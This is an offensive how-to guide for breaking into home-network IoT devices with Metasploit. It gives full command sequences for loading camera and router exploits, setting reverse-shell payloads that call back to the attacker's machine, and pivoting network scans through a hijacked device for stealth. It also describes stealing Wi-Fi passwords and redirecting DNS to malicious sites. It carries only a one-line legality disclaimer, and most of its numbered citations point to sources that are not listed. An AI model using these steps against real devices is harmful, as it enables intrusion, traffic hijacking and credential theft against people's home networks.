# Intrusive LAN Exploitation with Metasploit

## Introduction

You've mapped the network and identified devices. Now it's time to break in. Metasploit is the most powerful weapon in an attacker's arsenal for this task. It's a free, open-source platform that contains a massive database of exploits, payloads, and auxiliary tools. Instead of writing your own code, you simply find the right exploit for the target's vulnerability, configure it, and launch it.

This guide will focus on using Metasploit to compromise common IoT devices found on a home LAN, such as IP cameras, routers, and other smart gadgets.

---

## Prerequisites

*   Kali Linux (Metasploit is pre-installed).
*   Internal IP addresses and service versions from your Nmap scans.
*   A target device with a known vulnerability (e.g., a camera with default credentials, a router with a known RCE flaw).
*   For advanced attacks on non-WiFi devices, a supported hardware transceiver and the Metasploit RFTransceiver extension can be used^6^.

---

## Tutorial 1: Starting Metasploit and Searching for Exploits

First, you need to launch the Metasploit Framework console and find the right tool for the job.

### Objective
Launch Metasploit and search for exploits relevant to a target device.

### Commands

```bash
# Launch the Metasploit Framework Console
msfconsole

# Inside msfconsole, search for exploits.
# Let's say Nmap found a camera running "goahead web server" or a router with "MikroTik RouterOS".
# You search by vendor, product, or vulnerability type.

# Search for exploits related to a specific vendor (e.g., D-Link)
msf6 > search d-link

# Search for exploits related to a specific type of device
msf6 > search ip_camera

# Search for exploits that use default credentials
msf6 > search default_credentials

# Search for exploits related to a specific service (e.g., HTTP)
msf6 > search type:exploit platform:linux http
```

### What Happens
Metasploit will search its database and return a list of matching modules. Each result will have a name and a path (e.g., `exploit/linux/http/dlink_dir_300_600_upnp_exec`). You will use this path to load the exploit.

---

## Tutorial 2: Exploiting an IP Camera with Default Credentials

This is the most common and simplest attack vector against IoT devices. Many devices ship with hardcoded or default passwords that users never change^9^.

### Objective
Gain a shell on an IP camera by using an exploit that leverages default credentials.

### Commands

```bash
# Step 1: Load the exploit module
# Let's use a generic example. You'd replace this with a real exploit from your search.
msf6 > use exploit/linux/http/dlink_multi_camera_auth_bypass

# Step 2: View the exploit's options
msf6 exploit(dlink_multi_camera_auth_bypass) > options

# Step 3: Set the required options
# You must set the target's IP address (RHOSTS).
msf6 exploit(dlink_multi_camera_auth_bypass) > set RHOSTS 192.168.1.120

# Step 4: Set the payload
# The payload is the code you want to run on the target after exploitation.
# A generic command shell is a great start.
msf6 exploit(dlink_multi_camera_auth_bypass) > set payload linux/mipsbe/shell_reverse_tcp

# Step 5: Set the listener host (LHOST)
# This MUST be your Kali machine's IP address on the LAN.
msf6 exploit(dlink_multi_camera_auth_bypass) > set LHOST 192.168.1.100

# Step 6: Run the exploit
msf6 exploit(dlink_multi_camera_auth_bypass) > exploit
```

### What Happens
If the exploit is successful, Metasploit will establish a connection back to your machine, and you will be given a command shell on the camera. From here, you can explore the device's file system, view configuration files with clear-text passwords^1^, and even use the compromised device to attack other systems on the network^3^.

---

## Tutorial 3: Pivoting from a Compromised Router

Routers are high-value targets. Compromising a router gives you a powerful foothold, as it can control and monitor all traffic^7^.

### Objective
Exploit a known vulnerability in a router to gain a shell and then use it as a pivot point.

### Commands

```bash
# Assume you found a MikroTik router vulnerable to the "Winbox" directory traversal exploit.
msf6 > use exploit/linux/misc/mikrotik_winbox_traversal

# Set the target router's IP
msf6 exploit(mikrotik_winbox_traversal) > set RHOSTS 192.168.1.1

# Set the payload for a Linux-based router
msf6 exploit(mikrotik_winbox_traversal) > set payload linux/mipsle/shell_reverse_tcp

# Set your IP as the listener
msf6 exploit(mikrotik_winbox_traversal) > set LHOST 192.168.1.100

# Run the exploit
msf6 exploit(mikrotik_winbox_traversal) > exploit
```

### What Happens
Once you have a shell on the router, you can do significant damage. You can dump its configuration to find the Wi-Fi password, change DNS settings to redirect users to malicious sites, or even add firewall rules to make the router attack other devices on the LAN^3^. The router becomes your personal attack tool.

---

## Tutorial 4: Post-Exploitation - Scanning for More Targets from a Pwned Device

Once you control one IoT device, you can use it to launch attacks, hiding your true location.

### Objective
Use the shell on a compromised device to run Nmap and scan the network from its perspective.

### Commands
(These commands are run *inside* the Metasploit shell you just gained)

```bash
# First, check if you have a shell. If not, you can spawn one.
msf6 exploit(...) > sessions -i 1

# Inside the target's shell, you may not have Nmap. But you can try.
# A more reliable method is to use Metasploit's built-in port scanning module.
# Background the current session: press Ctrl+Z

# Use the Metasploit port scanning module
msf6 > use auxiliary/scanner/portscan/tcp

# Set the target range you want to scan
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.0/24

# Set the ports to scan
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 22,23,80,443,554,8080

# Tell Metasploit to run the scan through your existing session (the compromised device)
msf6 auxiliary(scanner/portscan/tcp) > set SESSION 1

# Run the scan
msf6 auxiliary(scanner/portscan/tcp) > run
```

### What Happens
You are now using the compromised IoT device as a proxy to scan the rest of the network. Any traffic from the scan appears to come from the compromised device (e.g., the IP camera at `192.168.1.120`), not from your Kali machine. This is a classic pivoting technique that helps you maintain stealth.

---

## Why Focus on IoT Devices?

*   **Low-Hanging Fruit:** They are often shipped with default credentials, hardcoded backdoors, and unpatched, outdated firmware^2,8,9^. The Mirai botnet famously exploited these weaknesses to enslave hundreds of thousands of devices^9^.
*   **High Impact:** Compromising a single device can give you a foothold for further attacks. You can use it to sniff traffic, act as a botnet node, or pivot to attack more sensitive systems like computers and servers^3,4^.
*   **Diverse Attack Surface:** IoT devices use a wide range of protocols (HTTP, Telnet, UPnP, custom wireless protocols) that are often poorly implemented, creating numerous opportunities for exploitation^1,6^.

## Important Considerations

*   **Instability:** Exploits, especially against cheap IoT hardware, can be unstable and may crash the target device.
*   **Detection:** While Metasploit can be used stealthily, many exploits generate significant network noise that can be detected by an Intrusion Detection System (IDS).
*   **Legality:** This is a direct, intrusive attack. Executing these exploits against devices you do not own is illegal and can have severe consequences. This guide is for educational use on authorized testbeds only.

1 Citations

r/sysadmin on Reddit: IoT devices are notoriously insecure, but why, how are they being exploited?
https://www.reddit.com/r/sysadmin/comments/v0oy13/iot_devices_are_notoriously_insecure_but_why_how/
